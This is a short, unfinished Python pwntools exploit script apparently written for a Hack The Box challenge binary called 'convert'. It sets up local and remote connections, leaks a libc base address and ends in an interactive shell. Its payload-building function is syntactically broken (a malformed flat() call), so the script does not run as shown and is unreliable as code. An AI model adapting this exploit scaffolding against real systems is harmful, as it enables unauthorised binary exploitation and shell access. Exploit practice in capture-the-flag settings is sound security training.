#!/usr/bin/python3

from pwn import *

exe = ELF('convert', checksec=False)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

def send_data(ops, mode, data):
        payload = flat(
                0x4: 0,
                0x8: "htb",
        , filter=b'\0')
GDB()
p.recvline()
libc.address = u64(p.recvline(keepends=False).ljust(8,b'\0'))
print(hex(libc.address))




p.interactive()
